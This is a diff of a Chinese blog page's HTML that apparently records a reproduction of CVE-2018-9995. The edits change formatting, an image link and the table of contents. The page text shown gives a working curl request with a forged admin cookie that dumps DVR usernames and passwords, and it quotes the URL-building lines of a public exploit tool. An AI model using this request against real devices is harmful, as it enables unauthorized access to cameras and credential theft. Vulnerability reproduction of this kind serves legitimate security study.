@@ -401,6 +401,13 @@
         
           
             
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+    </a>
+  </div>
+
 
           
         
@@ -437,10 +444,9 @@
 
   
   <h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>CVE-2018-9995</p>
-<p>##利用过程</p>
-<p>语句 <code>curl &quot;http://&lt;dvr_host&gt;:&lt;port&gt;/device.rsp?opt=user&amp;cmd=list&quot; -H &quot;Cookie: uid=admin&quot;</code></p>
+<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>语句 <code>curl &quot;http://&lt;dvr_host&gt;:&lt;port&gt;/device.rsp?opt=user&amp;cmd=list&quot; -H &quot;Cookie: uid=admin&quot;</code></p>
 <p>得到用户名和密码，登陆</p>
-<p>![4495902B-BF9B-49A2-BC9F-2E840B6908AC](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/4495902B-BF9B-49A2-BC9F-2E840B6908AC.png)</p>
+<p><img src="/images/pasted-311.png" class="lazyload" data-srcset="/images/pasted-311.png" srcset="data:image/png;base64,666" alt="upload successful"></p>
 <p>(视频加载太慢显示不出来)</p>
 <p>ezelf师傅的工具中，最重要语句如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fullHost_1  =   <span class="string">&quot;http://&quot;</span>+HST+<span class="string">&quot;:&quot;</span>+str(port)+<span class="string">&quot;/device.rsp?opt=user&amp;cmd=list&quot;</span></span><br><span class="line">host        =   <span class="string">&quot;http://&quot;</span>+HST+<span class="string">&quot;:&quot;</span>+str(port)+<span class="string">&quot;/&quot;</span></span><br></pre></td></tr></table></figure>
@@ -486,7 +492,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T16:32:35+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-04-01T16:43:33+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：Apr 1, 2021</p>
@@ -614,7 +620,7 @@
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text">漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-text">利用过程</span></a></li></ol>
     </div>
   </section>
 
